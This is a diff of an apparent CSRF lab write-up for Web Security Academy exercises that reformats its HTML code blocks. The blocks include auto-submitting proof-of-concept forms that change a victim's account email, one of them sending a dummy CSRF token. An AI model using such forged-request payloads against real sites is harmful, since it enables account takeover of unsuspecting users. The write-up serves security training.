@@ -37,14 +37,14 @@ This meets the conditions required for **CSRF**:
  
 ```html
 <html>
-    <body>
-        <form action="https://vulnerable-website.com/email/change" method="POST">
-            <input type="hidden" name="email" value="pwned@evil-user.net" />
-        </form>
-        <script>
-            document.forms[0].submit();
-        </script>
-    </body>
+ <body>
+ <form action="https://vulnerable-website.com/email/change" method="POST">
+ <input type="hidden" name="email" value="pwned@evil-user.net" />
+ </form>
+ <script>
+ document.forms[0].submit();
+ </script>
+ </body>
 </html>
 ```
 
@@ -74,14 +74,14 @@ For this lab, since I do not have Burp pro edition, I will go for the community 
 
 ```html
 <html></html>
-    <body>
-        <form action="https://0a4e0039034ff4a583cc1ef500f10015.web-security-academy.net/my-account/change-email" method="POST">
-            <input type="hidden" name="email" value="pwned@user.com" />
-        </form>
-        <script>
-            document.forms[0].submit();
-        </script>
-    </body>
+ <body>
+ <form action="https://0a4e0039034ff4a583cc1ef500f10015.web-security-academy.net/my-account/change-email" method="POST">
+ <input type="hidden" name="email" value="pwned@user.com" />
+ </form>
+ <script>
+ document.forms[0].submit();
+ </script>
+ </body>
 </html>
 ```
 
@@ -121,10 +121,10 @@ A common way to share CSRF tokens with the client is to include them as a hidden
 
 ```html
 <form name="change-email-form" action="/my-account/change-email" method="POST">
-    <label>Email</label>
-    <input required type="email" name="email" value="example@normal-website.com">
-    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
-    <button class='button' type='submit'> Update email </button>
+ <label>Email</label>
+ <input required type="email" name="email" value="example@normal-website.com">
+ <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
+ <button class='button' type='submit'> Update email </button>
 </form> 
 ```
 
@@ -174,17 +174,17 @@ Now, the bad request error does not appear, let's create an exploit for this vul
 
 ```html
 <html>
-    <body>
-        <script>history.pushState('', '', '/')</script>
-        <form action="https://0a2a0000044420138416a9c900d500de.web-security-academy.net/my-account/change-email">
-            <input type="hidden" name="email" value="jim&#64;hudson&#46;com" />
-            <input type="hidden" name="csrf" value="1234" />
-            <input type="submit" value="Submit request" />
-        </form>
-        <script>
-            document.forms[0].submit();
-        </script>
-    </body>
+ <body>
+ <script>history.pushState('', '', '/')</script>
+ <form action="https://0a2a0000044420138416a9c900d500de.web-security-academy.net/my-account/change-email">
+ <input type="hidden" name="email" value="jim&#64;hudson&#46;com" />
+ <input type="hidden" name="csrf" value="1234" />
+ <input type="submit" value="Submit request" />
+ </form>
+ <script>
+ document.forms[0].submit();
+ </script>
+ </body>
 </html>
 ```
 
